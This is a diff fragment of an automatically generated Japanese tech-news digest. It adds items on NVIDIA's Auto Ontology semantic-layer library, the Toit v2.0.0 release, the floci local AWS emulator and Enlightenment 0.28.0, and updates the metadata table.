+NVIDIA Auto Ontology は Apache-2.0 のライブラリで、企業メタデータからセマンティック層を構築し、システム間で定義を突き合わせ、その結果を **MCP、CLI、API** で任意のエージェント harness に公開する。README は解決したい失敗モードから始まる：「a revenue metric answered faster is worth nothing if the number is wrong.」（売上指標がどれだけ速く答えられても、数字が間違っていれば価値はゼロだ。）動詞は 4 つ——発見（メタデータからオントロジーを生成し、既存のものを接続し、知識グラフを構築する）、接地（指標と関係に信頼できる業務上の意味を与える）、検証（生成されたクエリを認証済みの定義とリネージに対して検査し、すべての回答に来歴を付ける）、公開。スタックは **Next.js 16 / React 19** のフロントエンドに Better Auth と Prisma、土台は Postgres 内のカタログ、`docs/` にアーキテクチャ図、配備は Helm と Docker Compose。
+
+リポジトリは **1,614 スター**、129 フォーク、作成は **2026-04-27** で、今日もコミットがある——07:57Z の `Prune semantic FKs from empty or disjoint source columns (#401)` と 07:41Z の `Leave the time of day out of the text-to-SQL system prompt (#400)`。導入前に読むべき点が 2 つある。README の Benchmarks 節には**数字が 1 つもなく**、BIRD のような text-to-SQL ベンチマークを走らせる別の評価リポジトリを指すだけであること。そして「This project is currently not accepting external contributions.」（本プロジェクトは現在、外部からのコントリビューションを受け付けていない）と明記されていること。加えて通常のリリースがなく、`releases.atom` にある唯一のタグは 2026-09-01 の `pre-main-merge-backup` ブランチマーカーなので、`main` がそのままリリースだ。
+
+**なぜ重要か：** エージェント分析で本当に難しいのは検索ではなく、「アクティブ顧客」の定義が 2 つのシステムで食い違うこと、そしてセマンティック層はその問いに対する正しい形の答えだ。しかし「信頼性が上がる」という主張は、読者が実際に手に取る成果物の中では測定ではなく断言になっている。だから MCP エンドポイントとオントロジー schema を成果物として扱い、精度の問いは README が委ねている BIRD 評価を誰かが回すまで開いたままにしておくべきだ。
+
+[`🔗 NVIDIA/auto-ontology`](https://github.com/NVIDIA/auto-ontology) · [`🔗 MCP サーバ文書`](https://github.com/NVIDIA/auto-ontology/blob/main/docs/mcp.md) · [`🔗 HN スレッド`](https://news.ycombinator.com/item?id=50348962)
+
+---
+
+## 45. Toit v2.0.0 は 4 年と 200 の alpha を経て alpha を抜けた——親会社が 2024 年に消えたマイコン向け言語
+
+- **Velocity:** ▮▮ rising
+- **Source:** Toit 公式ブログ · HN 120 pts · 2026-10-31 公開
+- **Tags:** `toit` `embedded` `language` `esp32` `lgpl`
+
+Florian Loitsch の告知は規模をそのまま書いている：「After more than four years of alpha development, 2,000+ commits, 500,000+ lines changed, and 200+ alpha releases, Toit v2.0.0 is finally here.」（4 年余りの alpha 開発、2,000 以上のコミット、50 万行以上の変更、200 以上の alpha リリースを経て、Toit v2.0.0 がついに登場した。）Toit は Toitware のクローズドソースとして始まり、後にオープンソース化され、**2024 年に Toitware が終了した後も**ボランティアが改善を続けた。何がバージョン番号を押し止めていたかも明快だ。予定されていた破壊的変更と、決して尽きない機能リスト——「we have accepted that this moment will never come.」（その瞬間は永遠に来ないと受け入れた。）最後に着地した破壊的変更は、周辺 API が `gpio.Pin` オブジェクトを要求せずピン番号を直接受け取れるようにするリファクタリングだった。
+
+オープンソース化以降、Arm ベースの **EC618** と「ほぼすべての ESP32 系」への対応、`toit` コマンドの統一（デスクトップのスクリプト言語としても使えるようにする）、コンパイラの書き直しが入った。未対応で明示的に先送りされているのは、フォーマッタ、コンパイラの解決改善、さらなるアーキテクチャ対応。リポジトリは `toitlang/toit`、**LGPL-2.1**、**1,461 スター**、作成 2021-11-12、`v2.0.0` タグは **2026-10-31T15:44Z**。
+
+**なぜ重要か：** 背後企業が消えて 2 年後に届く 2.0 は、「安定」が「機能完備」より狭く解釈されねばならないケースだ——それは「もう動かないもの」の一覧を意味し、それこそが組み込みツールチェーンがファームウェアに固定される前に本当に必要とする性質である。200 の alpha もこの話の正直な部分だ。間違っていたのはラベルであって、ソフトウェアではない。
+
+[`🔗 Toit v2.0.0`](https://toit.io/blog/toit-v2-0-0/) · [`🔗 toitlang/toit`](https://github.com/toitlang/toit) · [`🔗 v2.0.0 タグ`](https://github.com/toitlang/toit/releases/tag/v2.0.0)
+
+---
+
+## 46. floci は AWS をローカルで再実装する——アカウント不要、機能ゲートなし——2.8 万スター、3 日前に 2.4.0
+
+- **Velocity:** ▮▮ rising
+- **Source:** GitHub Trending · 本日 219 スター · 2.4.0 は 2026-10-31 リリース
+- **Tags:** `aws` `local-emulator` `testing` `java` `mit`
+
+floci はローカル AWS エミュレータだ——MIT、Java、**28,178 スター**——`localhost:4566` で AWS の形をしたサービスを提供し、AWS SDK、CLI、Terraform、CDK、OpenTofu、テストスイートをそのまま向けられる。売り文句は既存製品のライセンスモデルに直接向かう：「No account. No auth token. No feature gates. Just `docker compose up`.」（アカウント不要、auth token 不要、機能ゲートなし。`docker compose up` だけ。）README には移行の章があり、LocalStack を既に動かしている人にはイメージを差し替えるだけで済むと主張する。同じ組織の 4 兄弟の 1 つで、Azure（4577）、GCP（4588）、OCI（4599）をそれぞれ受け持つ。配布物には Docker なしで動く CLI 経路（`floci start`）もある。
+
+作成は **2026-02-18**、これまでに Hacker News へ 2 度（2026 年 3 月と 9 月）登場しているので、今日の 219 スターはローンチの急騰ではない。**2.4.0** のタグは **2026-10-31T22:10Z**、それ以前の 2.3.0、2.2.0、2.1.0 はおおむね 2〜4 週間間隔。フォークは 3,161。
+
+**なぜ重要か：** ローカルクラウドエミュレータは、CI が本番と同じ忠実度を要求し始めた時点で便利ツールではなくなり、そのセグメントの商業的リーダーは機能を有料トークンの後ろに置いている——MIT の再実装が狙うのはまさにその継ぎ目だ。導入前に確認すべきはスター数ではなくサービス表である。「AWS の形をしている」はスペクトルであり、「差し替え可能」はテストスイートが実際に呼ぶ部分集合についてのみ真だ。
+
+[`🔗 floci-io/floci`](https://github.com/floci-io/floci) · [`🔗 v2.4.0`](https://github.com/floci-io/floci/releases) · [`🔗 GitHub Trending`](https://github.com/trending?since=daily)
+
+---
+
+## 47. Enlightenment 0.28.0 が NetBSD、NetworkManager モジュール、PipeWire ミキサーを追加——Pants モジュールも復活
+
+- **Velocity:** ▮ steady
+- **Source:** enlightenment.org · 2026-10-31 公開 · HN 67 pts
+- **Tags:** `desktop` `enlightenment` `netbsd` `pipewire` `open-source`
+
+Carsten Haitzler による **0.28.0**（2026-10-31）のリリースノートは、新しいシェルではなく「インフラの追いつき」の長いリストだ。最大の塊はネットワーク。初期の **NetBSD 対応**（電源コマンドとシグナル処理を含む）、Wi-Fi・イーサネット・Bluetooth・VPN を扱う **NetworkManager モジュール**、NetworkManager と ConnMan の自動検出、電波強度とセキュリティ表示、保存済み接続の管理と「忘れる」ボタン、ユーザー名プロンプトと入力記憶を伴う VPN インポート、接続性コールバックとキャプティブポータルのログイン URL 更新処理。オーディオ側は **PipeWire ミキサーのネイティブ対応を PulseAudio と並存**させ、出力の選択や sink の切り替えをミキサー操作から行える。
+
+残りはデスクトップシェルが長年かけて蓄積する類のものだ。設定可能な永続履歴を持つ**クリップボード履歴**モジュール（項目ごとに削除可能）、復活した **Pants** モジュール（スカート、キルト、レーダーホーゼン）、バッテリーごとに記憶される充電上限、ACPI CPU 電源プロファイル対応、AMD GPU の電源設定と CPU 電源レベルの一致、そして NetworkManager のメモリ安全性・D-Bus ライフサイクル・シャットダウンの競合に関する一連の修正。
+
+**なぜ重要か：** かつて自前のネットワークスタックを積んでいたデスクトップ環境が、その両方を NetworkManager と PipeWire に委ねた——これは上位層でずっと起きてきた集約そのものであり、NetBSD 移植が現実的になった前提でもある。どちらもカーネルインターフェースではなくポータブルなサービスだからだ。このリリースの主題は地味だが正しい。自作デーモンを減らし、プラットフォーム自身の配管を増やす。代償は他人のライフサイクルに由来するバグだ。
+
+[`🔗 Enlightenment 0.28.0 リリースノート`](https://www.enlightenment.org/news/2026-10-31-enlightenment-0.28.0) · [`🔗 Enlightenment/efl（2026-11-02 にコミット）`](https://github.com/Enlightenment/efl) · [`🔗 HN スレッド`](https://news.ycombinator.com/item?id=50326530)
+
+---
+
 ## Metadata
 
 | Field | Value |
 |-------|-------|
-| Generated | 2026-11-03T04:25:33Z |
-| Items | 31 |
+| Generated | 2026-11-03T12:22:14Z |
+| Items | 47 |
 | Sources tracked | 22（Hacker News、GitHub Trending、arXiv、NVD、cveawg、ベンダーブログ、セキュリティ勧告） |
 | Update schedule | 04:03, 12:03, 20:03 UTC+8（1 日 3 回） |
 | Ranking | 速度加重（新しさ × エンゲージメント加速度 × 情報源の権威） |
